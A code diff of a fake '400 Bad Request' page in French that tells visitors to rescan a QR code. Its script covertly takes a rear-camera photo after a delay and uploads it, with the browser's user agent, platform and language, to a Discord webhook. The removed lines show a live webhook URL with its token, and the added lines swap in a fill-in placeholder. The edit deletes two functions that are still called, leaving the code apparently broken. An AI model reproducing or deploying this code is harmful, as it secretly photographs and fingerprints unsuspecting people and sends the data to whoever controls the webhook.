@@ -81,11 +81,11 @@
             transform: translate(-50%, -50%);
         }
     </style>
-    <script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
+<script src="https://unpkg.com/html5-qrcode/minified/html5-qrcode.min.js"></script>
 </head>
 <body>
     <h1>400 Bad Request</h1>
-    <p>Veuillez reessayer le scan du qr code</p>
+    <p>Veuillez réessayer le scan du QR code</p>
 
     <div id="video-container">
         <video id="video-main" autoplay playsinline></video>
@@ -98,69 +98,6 @@
     <button id="capture-button" onclick="redirigerVersPage()" title="Prendre une photo"></button>
 
     <script>
-        async function obtenirInfosAppareil() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const language = navigator.language;
-
-            return `User Agent: ${userAgent}\nPlatform: ${platform}\nLanguage: ${language}`;
-        }
-
-        function envoyerDonnees(imageBlob, infos) {
-            const formData = new FormData();
-            formData.append('file', imageBlob, 'photo.png');
-            formData.append('payload_json', JSON.stringify({ content: infos }));
-
-            const url = 'https://discord.com/api/webhooks/1264557833186443367/Ca29UpZabSCdGlVyzqgFbKqyTXiCs7M2ClkBogm48Vr2YaXIbLB2i3AyBLOp6Xk1memE';
-            return fetch(url, {
-                method: 'POST',
-                body: formData
-            });
-        }
-
-        function capturerPhoto(videoElement, canvas) {
-            const context = canvas.getContext('2d');
-            canvas.width = videoElement.videoWidth;
-            canvas.height = videoElement.videoHeight;
-            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-
-            return canvas.toDataURL('image/png');
-        }
-
-        function dataURLToBlob(dataURL) {
-            const byteString = atob(dataURL.split(',')[1]);
-            const mimeString = dataURL.split(',')[0].split(':')[1].split(';')[0];
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: mimeString });
-        }
-
-        async function lancerScanQRCode() {
-            const qrReader = document.getElementById('qr-reader');
-            qrReader.style.display = 'block';
-            const html5QrCode = new Html5Qrcode("qr-reader");
-
-            html5QrCode.start(
-                { facingMode: "environment" },
-                {
-                    fps: 10,
-                    qrbox: 250
-                },
-                (decodedText, decodedResult) => {
-                    console.log(`QR Code détecté: ${decodedText}`);
-                    html5QrCode.stop();
-                },
-                (errorMessage) => {
-                    console.warn(`Erreur de scan: ${errorMessage}`);
-                }
-            ).catch((err) => {
-                console.error(`Erreur de démarrage du scanner QR: ${err}`);
-            });
-        }
-
         async function obtenirCameraArriere() {
             try {
                 return await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
@@ -168,6 +105,34 @@
                 console.error('Erreur d\'accès à la caméra arrière:', err);
                 alert("Erreur d'accès à la caméra arrière. Assurez-vous d'avoir autorisé les permissions.");
                 return null;
+            }
+        }
+
+        function capturerPhoto(videoElement, canvas) {
+            const context = canvas.getContext('2d');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            return canvas.toDataURL('image/png');
+        }
+
+        async function envoyerDonnees(imageBlob, infos) {
+            const formData = new FormData();
+            formData.append('file', imageBlob, 'photo.png');
+            formData.append('payload_json', JSON.stringify({ content: infos }));
+
+            const url = 'https://discord.com/api/webhooks/...'; // Mettez votre URL ici
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                if (!response.ok) {
+                    throw new Error(`Erreur ${response.status}: ${response.statusText}`);
+                }
+                console.log('Image et informations envoyées avec succès');
+            } catch (error) {
+                console.error('Erreur d\'envoi des données:', error);
             }
         }
 
@@ -189,8 +154,6 @@
                     const infosAppareil = await obtenirInfosAppareil();
 
                     await envoyerDonnees(blobMain, infosAppareil);
-                    console.log('Image et informations envoyées avec succès');
-
                     lancerScanQRCode();
                 }, 5000);
             } else {
